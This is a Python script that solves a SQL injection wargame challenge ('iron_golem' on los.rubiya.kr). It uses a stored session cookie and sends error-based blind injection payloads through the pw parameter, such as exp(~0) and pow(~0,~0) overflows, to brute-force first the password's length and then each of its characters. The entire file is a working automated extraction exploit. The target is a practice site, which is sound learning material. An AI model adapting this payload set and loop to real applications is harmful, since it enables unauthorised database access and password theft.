import requests
from string import digits,ascii_lowercase

s = requests.Session()
cookies = {"PHPSESSID": "t3ph90fkrspl4c71i1b8re936n"}
payload1 = "(select id union select pw)"
payload2 = "(select exp(~0))"
payload3 = "(select pow(~0,~0))"
payload4 = "(select ~0%2b1)"
payload=[payload1,payload2,payload3,payload4][int(input("which payload :"))]
print("Payload :",payload)
url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?pw=' or if(length(pw)={},null,{});--+"
for i in range(100):
    r = s.get(url.format(i,payload), cookies=cookies)
    print(i,end='\r')
    if('query : ' in r.text):
        l=i
        break
print("Length :",l) 
url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?pw=' or if(pw like '{}%',null,{});--+"
pw = ""
for j in range(l):
    for i in digits+ascii_lowercase:
        r = s.get(url.format(pw+i,payload), cookies=cookies)
        if('query : ' in r.text and i not in "#+%&"):
            pw += i
            print("Password : {}".format(pw),end='\r')
            break
print("Password :", pw)
